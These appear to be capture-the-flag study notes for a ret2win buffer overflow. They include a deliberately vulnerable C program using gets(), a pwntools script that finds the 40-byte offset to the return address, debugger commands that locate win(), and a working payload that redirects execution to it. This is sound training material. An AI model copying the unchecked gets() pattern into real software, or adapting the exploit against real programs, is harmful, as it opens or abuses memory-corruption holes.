Program:
```c
#include <stdio.h>

void win() {
    printf("You win!\n");
}

int main() {
    char buffer[20];
    gets(buffer);
    printf("%s\n", buffer);
    return 0;
} 
```
Find offset to the RIP (how many bytes to RIP) using this code
```python
from pwn import *

p = process('./main')
p.sendline(cyclic(100))
p.wait()

core = p.corefile
print(cyclic_find(core.read(core.rsp, 8)))
```
This results in this output:

```shell
    Arch:      amd64-64-little
    RIP:       0x40119f
    RSP:       0x7ffeef3630b8
    Exe:       '/home/hlyudzyk/PycharmProjects/PythonProject/PythonProject2/ret2win/test' (0x400000)
    Fault:     0x6161616c6161616b
[!] cyclic_find() expected a 4-byte subsequence, you gave b'kaaalaaa'
    Unless you specified cyclic(..., n=8), you probably just want the first 4 bytes.
    Truncating the data at 4 bytes.  Specify cyclic_find(..., n=8) to override this.
40 << This is offset
```
Get address of win
```shell
pwndbg> p win
$1 = {<text variable, no debug info>} 0x401156 <win>
```
or 
```shell
info functions win
```
or
```shell
print win
```

Use it in payload:
```python
from pwnlib import gdb
from pwnlib.util.packing import p64

p = gdb.debug('./test', gdbscript="""b *main""")

payload = b'A' * 40 # The offset to the RIP
payload += p64(0x401156)

p.sendline(payload)
p.interactive()
```